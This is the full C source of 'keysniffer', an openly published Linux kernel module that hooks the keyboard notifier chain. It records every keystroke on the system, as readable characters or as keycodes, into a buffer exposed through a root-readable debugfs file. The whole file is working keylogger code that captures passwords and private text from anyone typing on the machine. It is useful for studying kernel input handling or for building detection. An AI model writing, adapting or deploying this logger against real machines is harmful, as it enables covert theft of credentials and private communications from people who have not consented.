/*
 * A Linux kernel module to grab keycodes and log to debugfs
 *
 * Author: Arun Prakash Jana <engineerarun@gmail.com>
 * Copyright (C) 2015 by Arun Prakash Jana <engineerarun@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with keysniffer. If not, see <http://www.gnu.org/licenses/>.
 */

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>

#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
#define CHUNK_LEN 12 /* Encoded 'keycode shift' chunk length */
#define US  0 /* Type code for US character log */
#define HEX 1 /* Type code for hexadecimal log */
#define DEC 2 /* Type code for decimal log */

#define KEYSNIFFER_VERSION "1.6"

/* User specified log pattern, used as a module parameter */
static int codes;

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
MODULE_VERSION(KEYSNIFFER_VERSION);
MODULE_DESCRIPTION("Sniff and log keys pressed in the system to debugfs");

/* Register global variable @codes as a module parameter with type and permissions */
module_param(codes, int, 0644);
/* Add module parameter description for @codes */
MODULE_PARM_DESC(codes, "log format (0:US keys (default), 1:hex keycodes, 2:dec keycodes)");

/* Declarations */
static struct dentry *file;
static struct dentry *subdir;

static ssize_t keys_read(struct file *filp,
		char *buffer,
		size_t len,
		loff_t *offset);

static int keysniffer_cb(struct notifier_block *nblock,
		unsigned long code,
		void *_param);

/* Definitions */

/*
 * Keymap references:
 * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
 * http://www.quadibloc.com/comp/scan.htm
 */
static const char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
	{"_PAUSE_", "_PAUSE_"},                                         // 119
};

static size_t buf_pos;
static char keys_buf[BUF_LEN] = {0};

const struct file_operations keys_fops = {
	.owner = THIS_MODULE,
	.read = keys_read,
};

/**
 * keys_read - read function for @file_operations structure
 */
static ssize_t keys_read(struct file *filp,
			 char *buffer,
			 size_t len,
			 loff_t *offset)
{
	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
}

static struct notifier_block keysniffer_blk = {
	.notifier_call = keysniffer_cb,
};

/**
 * keycode_to_string - convert keycode to readable string and save in buffer
 *
 * @keycode: keycode generated by the kernel on keypress
 * @shift_mask: Shift key pressed or not
 * @buf: buffer to store readable string
 * @type: log pattern
 */
void keycode_to_string(int keycode, int shift_mask, char *buf, int type)
{
	switch (type) {
	case US:
		if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
			const char *us_key = (shift_mask == 1)
			? us_keymap[keycode][1]
			: us_keymap[keycode][0];

			snprintf(buf, CHUNK_LEN, "%s", us_key);
		}
		break;
	case HEX:
		if (keycode > KEY_RESERVED && keycode < KEY_MAX)
			snprintf(buf, CHUNK_LEN, "%x %x", keycode, shift_mask);
		break;
	case DEC:
		if (keycode > KEY_RESERVED && keycode < KEY_MAX)
			snprintf(buf, CHUNK_LEN, "%d %d", keycode, shift_mask);
		break;
	}
}

/**
 * keysniffer_cb - keypress callback, called when a keypress
 * event occurs. Ref: @notifier_block structure.
 *
 * Returns NOTIFY_OK
 */
int keysniffer_cb(struct notifier_block *nblock,
		  unsigned long code,
		  void *_param)
{
	size_t len;
	char keybuf[CHUNK_LEN] = {0};
	struct keyboard_notifier_param *param = _param;

	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
		 code, param->down, param->shift, param->value);

	/* Trace only when a key is pressed down */
	if (!(param->down))
		return NOTIFY_OK;

	/* Convert keycode to readable string in keybuf */
	keycode_to_string(param->value, param->shift, keybuf, codes);
	len = strlen(keybuf);
	if (len < 1) /* Unmapped keycode */
		return NOTIFY_OK;

	/* Reset key string buffer position if exhausted */
	if ((buf_pos + len) >= BUF_LEN)
		buf_pos = 0;

	/* Copy readable key to key string buffer */
	strncpy(keys_buf + buf_pos, keybuf, len);
	buf_pos += len;

	/* Append newline to keys in special cases */
	if (codes)
		keys_buf[buf_pos++] = '\n';
	pr_debug("%s\n", keybuf);

	return NOTIFY_OK;
}

/**
 * keysniffer_init - module entry point
 *
 * Creates required debugfs directory and files
 * Registers the keyboard structure @notifier_block
 *
 * Returns 0 on successful initialization, otherwise
 * the appropriate error code in case of any error
 */
static int __init keysniffer_init(void)
{
	buf_pos = 0;

	if (codes < 0 || codes > 2)
		return -EINVAL;

	subdir = debugfs_create_dir("kisni", NULL);
	if (IS_ERR(subdir))
		return PTR_ERR(subdir);
	if (!subdir)
		return -ENOENT;

	file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
	if (!file) {
		debugfs_remove_recursive(subdir);
		return -ENOENT;
	}

	register_keyboard_notifier(&keysniffer_blk);
	return 0;
}

/**
 * keysniffer_exit - module exit function
 *
 * Unregisters the module from the kernel
 * Cleans up the debugfs directory to log keys
 */
static void __exit keysniffer_exit(void)
{
	unregister_keyboard_notifier(&keysniffer_blk);
	debugfs_remove_recursive(subdir);
}

module_init(keysniffer_init);
module_exit(keysniffer_exit);
